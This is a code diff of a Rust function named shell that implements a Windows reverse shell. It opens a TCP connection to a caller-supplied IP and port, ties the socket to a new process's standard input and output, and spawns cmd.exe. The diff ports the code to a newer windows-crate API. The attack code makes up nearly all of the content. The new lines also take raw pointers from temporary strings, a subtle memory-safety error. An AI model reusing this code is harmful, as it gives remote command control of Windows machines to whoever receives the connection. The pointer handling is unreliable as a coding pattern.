@@ -1,9 +1,10 @@
-use std::ffi::{c_void, CStr, CString};
-use std::{mem, ptr, slice};
+use core::ffi::c_void;
+use std::mem;
+use std::ffi::CStr;
 use windows::core::{PCSTR, PSTR};
 use windows::Win32::Foundation::HANDLE;
 use windows::Win32::Networking::WinSock::{
-    connect, htons, inet_pton, WSASocketA, WSAStartup, AF_INET, IPPROTO_TCP, SOCKADDR_IN,
+    connect, htons, inet_pton, WSASocketA, WSAStartup, AF_INET, IPPROTO_TCP, SOCKADDR, SOCKADDR_IN,
     SOCKET, SOCK_STREAM, WSADATA,
 };
 use windows::Win32::Security::SECURITY_ATTRIBUTES;
@@ -49,7 +50,7 @@ pub fn shell(ip: &str, port: u16) {
     // This is magic that I don't really understand but seems to work
     let sin_addr_ptr: *mut c_void = &mut sockaddr_in.sin_addr as *mut _ as *mut c_void;
     // Create a PCSTR and use the IP string as the 0 field
-    let ip_pcstr = PCSTR(CString::new(ip).unwrap().into_raw() as *mut u8);
+    let ip_pcstr = PCSTR::from_raw(format!("{ip}\0").as_mut_ptr());
     // Calling pton with the pointer sin_addr_ptr --> sockaddr_in.sin_addr should mean sockaddr_in.sin_addr has the IP struct now
     let conversion_result = unsafe { inet_pton(AF_INET.0 as i32, ip_pcstr, sin_addr_ptr) };
     if conversion_result != 1 {
@@ -64,14 +65,7 @@ pub fn shell(ip: &str, port: u16) {
     // Connect the socket!
     // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-connect
     // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/Networking/WinSock/fn.connect.html
-    let sockaddr_slice = unsafe {
-        slice::from_raw_parts(
-            (&sockaddr_in as *const SOCKADDR_IN) as *const u8,
-            mem::size_of::<SOCKADDR_IN>(),
-        )
-    };
-
-    let connection_result = unsafe { connect(socket, sockaddr_slice) };
+    let connection_result = unsafe { connect(socket, &sockaddr_in as *const SOCKADDR_IN as *const SOCKADDR, mem::size_of::<SOCKADDR_IN>() as _) };
     if connection_result != 0 {
         panic!("Unable to call connect to the remote socket")
     }
@@ -97,11 +91,7 @@ pub fn shell(ip: &str, port: u16) {
     startup_info.hStdInput = unsafe { *sock_handle };
     startup_info.hStdOutput = unsafe { *sock_handle };
     startup_info.hStdError = unsafe { *sock_handle };
-    let lp_command_line = PSTR(
-        CString::new(format!("{system_dir}\\cmd.exe"))
-            .unwrap()
-            .into_raw() as *mut u8,
-    );
+    let lp_command_line = PSTR::from_raw(format!("{system_dir}\\cmd.exe\0").as_mut_ptr());
     let create_res = unsafe {
         CreateProcessA(
             PCSTR::null(),
@@ -110,7 +100,7 @@ pub fn shell(ip: &str, port: u16) {
             Some(&SECURITY_ATTRIBUTES::default()),
             true,
             PROCESS_CREATION_FLAGS::default(),
-            ptr::null(),
+            None,
             PCSTR::null(),
             &startup_info,
             &mut PROCESS_INFORMATION::default(),
